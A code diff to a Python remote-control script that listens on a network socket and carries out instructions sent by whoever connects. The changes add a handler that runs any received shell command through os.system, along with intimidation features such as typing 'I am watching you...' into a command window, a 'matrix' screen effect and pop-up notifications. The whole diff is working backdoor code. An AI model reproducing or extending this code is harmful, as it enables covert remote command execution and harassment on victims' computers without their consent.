@@ -4,6 +4,7 @@ import mouse
 import os
 import keyboard
 import time
+import plyer
 
 def me():
     returned_output = str(subprocess.check_output("whoami"))[2:-1]
@@ -52,13 +53,28 @@ def Mystify():
 def watchingYou():
     os.system("start cmd")
     time.sleep(0.1)
-    keyboard.write("I am watching you...")
-    time.sleep(3.0)
+    keyboard.write("I am watching you...", 0.1)
+    time.sleep(1.0)
     keyboard.press("alt")
     keyboard.press("f4")
     keyboard.release("alt")
     keyboard.release("f4")
     conn.send("Successfully typed 'I am watching you...'".encode("utf-8"))
+def cmdCommand(cmd):
+    conn.send("Trying to run your command...".encode("utf-8"))
+    os.system(cmd)
+    conn.send("Successfully started command".encode("utf-8"))
+def matrixRun():
+    os.startfile("matrix.bat")
+    time.sleep(0.1)
+    keyboard.press("alt")
+    keyboard.press("enter")
+    keyboard.release("alt")
+    keyboard.release("enter")
+    conn.send("Successfully turned matrix on".encode("utf-8"))
+def notificationSend(msg):
+    plyer.notification.notify(message=msg)
+    conn.send("Successfully sent your notification".encode("utf-8"))
 
 sock = socket.socket()
 sock.bind(("", 2345))
@@ -94,10 +110,28 @@ while True:
             hideWindows()
         elif data == "iamwatchingyou" or data == "watching" or data == "cmdScreammer":
             watchingYou()
+        elif data == "matrix":
+            matrixRun()
         elif "type" in data:
             spisok = data.split("=")
             try:
                 typing(spisok[1])
+            except IndexError:
+                conn.send("Error 2: Invalid syntax".encode("utf-8"))
+            except Exception:
+                conn.send("Unknown error".encode("utf-8"))
+        elif "cmd" in data:
+            spisok = data.split("=")
+            try:
+                cmdCommand(spisok[1])
+            except IndexError:
+                conn.send("Error 2: Invalid syntax".encode("utf-8"))
+            except Exception:
+                conn.send("Unknown error".encode("utf-8"))
+        elif "note" in data:
+            spisok = data.split("=")
+            try:
+                notificationSend(spisok[1])
             except IndexError:
                 conn.send("Error 2: Invalid syntax".encode("utf-8"))
             except Exception:
